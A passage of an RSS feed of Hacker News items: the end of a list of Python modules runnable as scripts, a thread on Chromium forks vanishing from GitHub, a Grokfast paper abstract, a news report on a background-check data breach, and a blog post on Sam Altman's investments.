<td><a href="#profile" target="_blank"><code>pstats</code></a></td>
<td>Show stats on cProfile-generated file</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#pickle" target="_blank"><code>pickle</code></a></td>
<td>Readably display pickle file contents</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#pickle" target="_blank"><code>pickletools</code></a></td>
<td>Disassemble a pickle file</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#tabnanny" target="_blank"><code>tabnanny</code></a></td>
<td>Check file for mixed tabs &amp; spaces</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#this" target="_blank"><code>this</code></a></td>
<td>Display the Zen of Python (PEP 20)</td>
<td>Fun</td>
</tr>
<tr>
<td><a href="#__hello__" target="_blank"><code>__hello__</code></a></td>
<td>Print <code>Hello world!</code></td>
<td>Fun</td>
</tr>
<tr>
<td><a href="#antigravity" target="_blank"><code>antigravity</code></a></td>
<td>Open XKCD 353 in a web browser</td>
<td>Fun</td>
</tr>
<tr>
<td><a href="#turtledemo" target="_blank"><code>turtledemo</code></a></td>
<td>See <code>turtle</code> module demos</td>
<td>Fun</td>
</tr>
<tr>
<td><a href="#code" target="_blank"><code>code</code></a></td>
<td>Run a Python REPL</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#runpy" target="_blank"><code>runpy</code></a></td>
<td>Run a Python module as a script</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#timeit" target="_blank"><code>timeit</code></a></td>
<td>Time a Python expression</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#site" target="_blank"><code>site</code></a></td>
<td>See "site" information about Python</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#sysconfig" target="_blank"><code>sysconfig</code></a></td>
<td>Show Python configuration details</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#platform" target="_blank"><code>platform</code></a></td>
<td>Display current platform information</td>
<td>General</td>
</tr>
<tr>
<td><a href="#mimetypes" target="_blank"><code>mimetypes</code></a></td>
<td>Show file mimetype/extension details</td>
<td>General</td>
</tr>
<tr>
<td><a href="#quopri" target="_blank"><code>quopri</code></a></td>
<td>Encode/decode raw email data</td>
<td>General</td>
</tr>
<tr>
<td><a href="#filecmp" target="_blank"><code>filecmp</code></a></td>
<td>Compare contents of 2 directories</td>
<td>General</td>
</tr>
<tr>
<td><a href="#rot13" target="_blank"><code>encodings.rot_13</code></a></td>
<td>ROT-13 encode/decode text</td>
<td>General</td>
</tr>
</tbody>
</table>
<p>I discovered the command-line interface for many of these modules by using <a href="https://pym.dev/p/2eyt4/" target="_blank">this script</a>, which looks for command-line interfaces among all Python standard library modules.</p>
<p>Note that older versions included even more modules that could be run as scripts.
The standard library also included scripts for a <code>uu</code> module before Python 3.12 and <code>formatter</code>, <code>binhex</code>, <code>test.pystone</code>, and <code>hotshot.stones</code> existed in Python 2.</p>
<p>These are just the Python scripts included in the Python standard library.
Any third-party module that can be run as a script can also be launched via <code>python -m MODULE_NAME</code> as well.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Tell HN: Chromium forks for legacy platforms are disappearing from GitHub (107 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=40567326</link>
            <guid>40567326</guid>
            <pubDate>Mon, 03 Jun 2024 20:43:55 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=40567326">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <tbody><tr id="40568138"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_40568138" href="https://news.ycombinator.com/vote?id=40568138&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>Even though all of this should be perfectly legal and follows TOS, GitHub really isn’t the place to host anything possibly damaging to or annoying big tech.</p><p>You can add push URLs to your origin branch such that `git push` automatically mirrors your code on multiple remotes: `git remote set-url --add --push origin git://another/repo.git`. If you maintain an open source repository, I would encourage you to have mirrors across gitlab, codeberg, and/or a self hosted gitea instance.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40568282"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_40568282" href="https://news.ycombinator.com/vote?id=40568282&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>I'm certainly not against mirrors. But—</p><p>&gt; GitHub really isn’t the place to host anything possibly damaging to or annoying big tech.</p><p>Why would Google give a crap if a handful of people futzing around with ancient versions of Windows and macOS want to run up-to-date Chromium browsers?</p><p>If you wanted to be super conspiratorial, you could point to Supermium's statement[1] that they plan to retain Manifest V2 support. But that merely puts them in the same category as Brave and Firefox.</p><p>At the same time, I don't know how else to explain what is going on!</p><p>---</p><p>1: <a href="https://win32subsystem.live/supermium/#:~:text=Manifest%20V2%20is%20NOT%20slated%20for%20removal%20from%20Supermium%20browser" rel="nofollow">https://win32subsystem.live/supermium/#:~:text=Manifest%20V2...</a>.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40569497"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_40569497" href="https://news.ycombinator.com/vote?id=40569497&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>Im keen to believe this is a genuine mistake on either GitHub or Google’s end. Perhaps some automated system they’re testing out.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="40568775"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_40568775" href="https://news.ycombinator.com/vote?id=40568775&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>Conspiracy hat: Google is fighting ad blockers via the new v3 manifest to keep the YouTube milk cow going. They will soon be rejecting v2 plugins and probably expect some flight to chromium.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="40568847"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_40568847" href="https://news.ycombinator.com/vote?id=40568847&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>Maybe take the hat off for a minute and consider how they'd possibly retroactively revoke the (non-revokable) open source licenses that all Chromium versions published to date have been licensed under.</p><p>Then ask yourself what the benefit of all that – already impossible – endeavor would be, given that Firefox also exists and isn't deprecating Manifest V2.</p><p>Finally, ask yourself which actual paths Google could take to still eventually force MFv3 on most web users without resorting to any such drastic and publicly-visible measures.</p><p>See? You didn't really need the hat!</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40570827"><td><table>  <tbody><tr>    <td indent="4"><img src="https://news.ycombinator.com/s.gif" height="1" width="160"></td><td>
      <center><a id="up_40570827" href="https://news.ycombinator.com/vote?id=40570827&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>they don’t have to revoke the license, they just add this for new versions</p><p>&gt; what the benefit of all that endeavor would be</p><p>Breaking all adblockers for good, ensuring revenue. Firefox has almost no marketshare so it’s more or less irrelevant.</p><p>&gt; which actual paths Google could take to still eventually force MFv3</p><p>Next steps are to break the web more and more for non-chromium browsers. Already many sites that don’t work well with FF/Safari. 
There will be reasonable reasons to do that (eg protect the kids) but the end result will be 1 browser dominance and ads tattooed into your eyeballs - mark my words!!1</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40573301"><td><table>  <tbody><tr>    <td indent="5"><img src="https://news.ycombinator.com/s.gif" height="1" width="200"></td><td>
      <center><a id="up_40573301" href="https://news.ycombinator.com/vote?id=40573301&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>&gt; Next steps are to break the web more and more for non-chromium browsers</p><p>What stops people from switching to Brave, or some light fork that's basically "Chromium + Manifest V2"?</p><p>Google would need something akin to Web Attestation. And yes they <i>did</i> try that—so if you're going to put your conspiracy hat on I'd direct your attention there.</p></div></td></tr>
        </tbody></table></td></tr>
                                          <tr id="40567374"><td></td></tr>
                <tr id="40567775"><td></td></tr>
                <tr id="40568259"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_40568259" href="https://news.ycombinator.com/vote?id=40568259&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>How would Google push DRM by filing false [1] copyright claims against various Chromium forks, which presumably wouldn't even contain any hypothetical DRM keys?</p><p>Regular old Chrome does in fact include a Widevine DRM binary blob, but Chromium doesn't contain the source for it.</p><p>If Google really wanted to push something like browser attestation (like they potentially did with their Web Environment Integrity proposal), almost by definition that part couldn't be open sourced either and would not be part of Chromium.</p><p>[1] Chromium is licensed under various open source licenses that Google can't retroactively revoke. Even for code that they own the full copyright on, they can at most release future versions under a closed license; for GPL-ed dependencies, that wouldn't work at all (not sure if Chromium has any).</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40570717"><td></td></tr>
                              <tr id="40569339"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_40569339" href="https://news.ycombinator.com/vote?id=40569339&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>In the thread you posted:</p><p>"Bluebox doesn't know why his Github account disappeared, but it was not intentional and he has contacted Github support!"</p><p>"the Supermium GitHub repository is currently unavailable. Efforts are being made to restore the repository"</p><p>If this is true, it could be because of using Google API Keys in the software.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40569766"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_40569766" href="https://news.ycombinator.com/vote?id=40569766&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>API keys are a good theory but as far as I can tell, at least in Chromium Legacy they're set up correctly per Google's policies. You can sign into a Google Account in the released builds of Chromium (so they are embedded in the binary) but when I compile the source myself the keys aren't there, so they haven't been disclosed in the source.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                  <tr id="40569321"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_40569321" href="https://news.ycombinator.com/vote?id=40569321&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>I'm not sure if GitHub is the right place for chromium mirrors. When you upload to GitHub, you are agreeing that the code is licensed to GitHub under certain conditions (in addition to the license specified in the repository).</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="40569390"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_40569390" href="https://news.ycombinator.com/vote?id=40569390&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>Although a potential issue generally, it's unrelated here.</p><p>If it's already open source, GitHub can almost (depending on license) use it as they see fit anyway.</p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="40567786"><td></td></tr>
                <tr id="40568210"><td></td></tr>
                            <tr id="40570268"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_40570268" href="https://news.ycombinator.com/vote?id=40570268&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>Isn't GitHub owned by Microsoft?  Isn't Microsoft using GitHub to train AI? Doesn't Google also have AI ambitions?</p><p>I think it plausible that we are seeing the shadows cast by competitive maneuvering between two industry heavy-weights.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="40567906"><td></td></tr>
                <tr id="40568224"><td></td></tr>
                <tr id="40568746"><td></td></tr>
                <tr id="40569796"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_40569796" href="https://news.ycombinator.com/vote?id=40569796&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>The beauty of git (everyone has a full copy of the repo). Although this being an installable browser targeted more towards end users I wouldn’t trust a repo from anyone other than the official maintainers.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                              <tr id="40571585"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_40571585" href="https://news.ycombinator.com/vote?id=40571585&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>It's notable that Chromium is an especially large repo, and it seems has been special cased in githubs repo size limits.</p><p>It's possible this is GitHub just enforcing their size limit</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="40570763"><td></td></tr>
            <tr id="40567798"><td></td></tr>
                <tr id="40568196"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_40568196" href="https://news.ycombinator.com/vote?id=40568196&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>How would it? Google can't retroactively un-license the Chromium source, which is under various open source licenses that I'm almost certain all include at a minimum the right to host a fork somewhere.</p><p>Additionally, if you are concerned about MF3, your best bet isn't some outdated Chromium fork – it's Firefox.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40569004"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_40569004" href="https://news.ycombinator.com/vote?id=40569004&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>Just to be clear, Chromium Legacy and Supermium aren't outdated, that's what makes them great. They work on outdated operating systems, but they track up-to-date Chromium.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="40570119"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_40570119" href="https://news.ycombinator.com/vote?id=40570119&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>That is great!</p><p>I kind of assumed as much, but unfortunately that also most likely means that it'll lose Manifest V2 support at some point (not that upstream Chrome will keep it).</p><p>That seems to be the concern of some people commenting here, and I wanted to highlight that the two are largely orthogonal as far as I can tell.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40573267"><td></td></tr>
                        <tr id="40571536"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_40571536" href="https://news.ycombinator.com/vote?id=40571536&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>Google can't take back the source but they can make distribution of binaries hard? Most Windows users are very dependent on pre-built binaries, for example.</p><p>And doesn't Google have leverage over Mozilla by way of their funding?</p></div></td></tr>
        </tbody></table></td></tr>
                        </tbody></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Grokfast: Accelerated Grokking by Amplifying Slow Gradients (109 pts)]]></title>
            <link>https://arxiv.org/abs/2405.20233</link>
            <guid>40567165</guid>
            <pubDate>Mon, 03 Jun 2024 20:27:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2405.20233">https://arxiv.org/abs/2405.20233</a>, See on <a href="https://news.ycombinator.com/item?id=40567165">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2405.20233">View PDF</a>
    <a href="https://arxiv.org/html/2405.20233v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>One puzzling artifact in machine learning dubbed grokking is where delayed generalization is achieved tenfolds of iterations after near perfect overfitting to the training data. Focusing on the long delay itself on behalf of machine learning practitioners, our goal is to accelerate generalization of a model under grokking phenomenon. By regarding a series of gradients of a parameter over training iterations as a random signal over time, we can spectrally decompose the parameter trajectories under gradient descent into two components: the fast-varying, overfitting-yielding component and the slow-varying, generalization-inducing component. This analysis allows us to accelerate the grokking phenomenon more than $\times 50$ with only a few lines of code that amplifies the slow-varying components of gradients. The experiments show that our algorithm applies to diverse tasks involving images, languages, and graphs, enabling practical availability of this peculiar artifact of sudden generalization. Our code is available at \url{<a href="https://github.com/ironjr/grokfast" rel="external noopener nofollow">this https URL</a>}.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Jaerin Lee [<a href="https://arxiv.org/show-email/1db31335/2405.20233">view email</a>]      <br>    <strong>[v1]</strong>
        Thu, 30 May 2024 16:35:30 UTC (7,934 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Crooks threaten to leak 3B personal records 'stolen from background check firm' (115 pts)]]></title>
            <link>https://www.theregister.com/2024/06/03/usdod_data_dump/</link>
            <guid>40566938</guid>
            <pubDate>Mon, 03 Jun 2024 20:07:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2024/06/03/usdod_data_dump/">https://www.theregister.com/2024/06/03/usdod_data_dump/</a>, See on <a href="https://news.ycombinator.com/item?id=40566938">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p>Billions of records detailing people's personal information may soon be dumped online after being allegedly obtained from a Florida firm that handles background checks and other requests for folks' private info.</p>
<p>A criminal gang that goes by the handle USDoD put the database up for sale for <a target="_blank" rel="nofollow" href="https://x.com/H4ckManac/status/1777246310782902686">$3.5 million</a> on an underworld forum in April, and rather incredibly claimed the trove included 2.9 billion records on all US, Canadian, and British citizens. It's believed one or more miscreants using the handle SXUL was responsible for the alleged exfiltration, who passed it onto USDoD, which is acting as a broker.</p>
<p>The pilfered information is said to include individuals' full names, addresses, and address history going back at least three decades, social security numbers, and people's parents, siblings, and relatives, some of whom have been dead for nearly 20 years. According to USDoD, this info was not scraped from public sources, though there may be duplicate entries for people in the database.</p>

    

<p>Fast forward to this month, and the infosec watchers at VX-Underground say they've not only <a target="_blank" rel="nofollow" href="https://x.com/vxunderground/status/1797047998481854512?s=46">been able to view</a> the database and verify that at least some of its contents are real and accurate, but that USDoD plans to leak the trove. Judging by VX-Underground's assessment, the 277.1GB file contains nearly three billion records on people who've at least lived in the United States – so US citizens as well as, say, Canadians and Brits.</p>

        

<p>This info was allegedly stolen or otherwise obtained from National Public Data, a small information broker based in Coral Springs that offers API lookups to other companies for things like background checks. The biz did not respond to <em>The Register</em>'s inquiries.</p>
<ul>

<li><a href="https://www.theregister.com/2023/09/21/transunion_data_dump/">TransUnion reckons big dump of stolen customer data came from someone else</a></li>

<li><a href="https://www.theregister.com/2023/09/13/airbus_data_leak/">Airbus suffers data leak turbulence to cybercrooks' delight</a></li>

<li><a href="https://www.theregister.com/2024/05/31/snowflake_breach_report/">Snowflake denies miscreants melted its security to steal data from top customers</a></li>

<li><a href="https://www.theregister.com/2024/05/31/cyber_cops_plead_for_info/">Cyber cops plead for info on elusive Emotet mastermind</a></li>
</ul>
<p>There is a small silver lining, according to the VX team: "The database DOES NOT contain information from individuals who use data opt-out services. Every person who used some sort of data opt-out service was not present." So, we guess this is a good lesson in <a target="_blank" rel="nofollow" href="https://www.nationalpublicdata.com/optout.html">opting out</a>.</p>
<p>USDoD is the same crew that previously peddled a 3GB-plus database from <a target="_blank" href="https://www.theregister.com/2023/09/21/transunion_data_dump/">TransUnion</a> containing financial information on 58,505 people.</p>
<p>And last September, the same criminals touted personal information belonging to <a target="_blank" href="https://www.theregister.com/2023/09/13/airbus_data_leak/">3,200 Airbus vendors</a> after the aerospace giant fell victim to an intrusion. ®</p>                                
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Sam Altman, Lately (152 pts)]]></title>
            <link>http://oftheclock.com/sam-altman-lately</link>
            <guid>40566605</guid>
            <pubDate>Mon, 03 Jun 2024 19:33:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://oftheclock.com/sam-altman-lately">http://oftheclock.com/sam-altman-lately</a>, See on <a href="https://news.ycombinator.com/item?id=40566605">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="container">
  <article id="x989J6HzYKrnDLWBoNy8JF">
	<time datetime="2024-06-03">June  3, 2024</time>
  <h2>
    <a href="http://oftheclock.com/sam-altman-lately">Sam Altman, Lately</a>
  </h2>
	<p>A few day ago, YCombinator boss Paul Graham <a href="https://x.com/paulg/status/1796107666265108940">posted an image</a> on X<sup id="fnref1"><a href="#fn1">1</a></sup>, providing an explanation behind Altman’s departure from YCombinator’s main leadership position. Graham’s attempt to dispel rumors of Altman’s supposed firing didn’t work as well as hoped, with many of the responses reiterating that making him choose between OpenAI &amp; YCombinator still constituted a form of firing. However, the more substantial revelation was a few posts later.</p>

<p>While responding to replies, it seems that Graham was <a href="https://x.com/JacquesThibs/status/1796131984688738401">informed</a> — and later <a href="https://x.com/paulg/status/1796174494026879040">confirmed</a> — that Altman had, in a pretty clear conflict of interest and obviously unbeknownst to YCombinator leadership, invested a tidy sum of $10 million into OpenAI’s for-profit arm.</p>

<p>Not a great look.</p>

<p>This morning, the <strong><em>Wall Street Journal</em></strong> went even further with an expose on Altman’s burgeoning business empire, in a piece titled <em><a href="https://www.wsj.com/tech/ai/openai-sam-altman-investments-004fc785?mod=hp_lead_pos7">The Opaque Investment Empire Making OpenAI’s Sam Altman Rich</a></em>. According to the <em><strong>WSJ</strong></em>, Altman has:</p>
<blockquote>
<p>“…a sprawling investment empire that is becoming a direct beneficiary of OpenAI’s success.”</p>
</blockquote>
<p>Supposedly to the tune of about $2.8 billion.</p>

<p>Now, how does that happen when Altman only makes a small salary from OpenAI, and — according to him &amp; the company — doesn’t directly own any of it?</p>

<p>Altman’s personal investments range in everything from nuclear fission reactor start-up Helion to being the third largest public stake in Reddit. Reddit, one of the companies that has a content-sharing deal in place with OpenAI to train ChatGPT. </p>
<blockquote>
<p>“A growing number of Altman’s startups do business with OpenAI itself, either as customers or major business partners. The arrangement puts Altman on both sides of deals, creating a mounting list of potential conflicts in which he could personally benefit from OpenAI’s work.”</p>
</blockquote>
<p>Directly, or indirectly, the streak of intentionally investing in companies that have a conflict of interest doesn’t seem to be declining, either — the exact opposite seems to be true. </p>

<p>Consequences of this dynamic can include placing employees in a real awkward situation, even if according to OpenAI he’s recused himself from some of the deals between the ChatGPT developer and outside companies he’s invested in. Even if he’s not involved in the deals directly, employees now have to consider that their boss is directly affected on each side of a deal, by decisions they could make, is almost sure to have an influence on the outcome. All while they’re supposed to be working for OpenAI’s benefit specifically.</p>

<p>Another article, also issued by the <strong><em>Wall Street Journal</em></strong>, aptly named “<em><a href="https://www.wsj.com/tech/ai/chatgpt-sam-altman-artificial-intelligence-openai-b0e1c8c9?mod=article_inline">The Contradictions of Sam Altman, AI Crusader</a></em>”, touched on some of these issues in March of last year. In it, his investments in Helion ($375mil) &amp; Retro ($180mil) were stated as being “almost all of his liquid wealth.” He was also known to be apart of other projects — including Worldcoin — though the steep growth of his fortune, going from reported between $500-$700 million in March 2023, to $2.8 billion in less than 12 months later is pretty incredible. Especially given his public stance on the financing’s influence on AI’s development.</p>
<blockquote>
<p>“He owns no stake in the ChatGPT developer, saying he doesn’t want the seductions of wealth to corrupt <a href="https://www.wsj.com/tech/ai/chatgpt-sam-altman-artificial-intelligence-openai-b0e1c8c9?mod=article_inline">the safe development of artificial intelligence</a>, and makes a yearly salary of just $65,000.”</p>
</blockquote>
<p>The fact that he’s so clearly financially tied to OpenAI through a diverse set of investments kind of throws the idea that he only takes a $65,000 salary for altruistic reasons directly out of the window. It also lends insight to the leadership dust-up last year.</p>

<p>In November, OpenAI ousted Altman. <a href="https://www.theverge.com/2024/5/28/24166713/openai-helen-toner-explains-why-sam-altman-was-fired">This recent piece</a> by <strong><em>The Verge</em></strong> expounds on the initial reasoning of the board that, at the time, didn’t trust Altman. One of the cited reasons was Altman’s failure to inform the board of his ownership of the OpenAI Startup Fund. Seems like there is a pattern here.</p>

<p>Transparency is probably something Altman would do well to take steps to personally improve, especially after a majority of the board members who pushed out Altman were, as a result of his deal to return, pushed out themselves, resulting in even less oversight. Less critical oversight, at least. Let’s hope — as Altman would put it — for the safety of artificial intelligence, and therefore humanity as whole, transparency does improve across the board. That’s really all we can ask for, given that asking people to <em>actually</em> put financial gain aside as a motivating factor doesn’t seem to historically work out.</p>

<hr>

<p>Any comments, suggestions or corrections can be sent to: <a href="mailto:mail@oftheclock.com">mail@oftheclock.com</a></p>



  <figure id="kudo_x989J6HzYKrnDLWBoNy8JF">
    <a href="#kudo">
      
    </a>
    <p>55</p>
    <p>Kudos</p>
  </figure>
  <figure id="kudo_side_x989J6HzYKrnDLWBoNy8JF">
    <a href="#kudo">
      
    </a>
    <p>55</p>
    <p>Kudos</p>
  </figure>
</article>

</section></div>]]></description>
        </item>
    </channel>
</rss>